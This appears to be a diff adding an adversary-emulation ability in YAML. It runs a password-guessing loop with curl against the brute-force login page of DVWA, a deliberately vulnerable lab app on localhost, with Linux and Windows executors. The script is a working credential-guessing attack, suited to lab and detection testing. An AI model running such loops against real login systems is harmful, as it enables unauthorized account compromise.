@@ -1,0 +1,30 @@
+- id: a1b2c3d4-dvwa-0002-brut-000000000002
+  name: DVWA - Brute Force Probe (Low)
+  description: Attempts credential spray against DVWA brute force endpoint
+  tactic: credential-access
+  technique_id: T1110.001
+  technique_name: "Brute Force: Password Guessing"
+  repeatable: false
+  executors:
+    - name: sh
+      platform: linux
+      command: |
+        DVWA_URL="${DVWA_URL:-http://127.0.0.1:80/dvwa}"
+        COOKIE_FILE="/tmp/dvwa_cookie.txt"
+        for pass in password admin 123456 test; do
+          curl -s -b "$COOKIE_FILE" -b "security=low" "$DVWA_URL/vulnerabilities/brute/?username=admin&password=$pass&Login=Login" > /dev/null || true
+        done
+        echo "[+] Completed Brute Force probe"
+        exit 0
+      timeout: 30
+    - name: psh
+      platform: windows
+      command: |
+        $DvwaUrl = if ($env:DVWA_URL) { $env:DVWA_URL } else { "http://127.0.0.1:80/dvwa" }
+        $CookieFile = "$env:TEMP\dvwa_cookie.txt"
+        @('password', 'admin', '123456') | ForEach-Object {
+          curl.exe -s -b "$CookieFile" -b "security=low" "$DvwaUrl/vulnerabilities/brute/?username=admin&password=$_&Login=Login" | Out-Null
+        }
+        Write-Output "[+] Completed Brute Force probe"
+        exit 0
+      timeout: 30
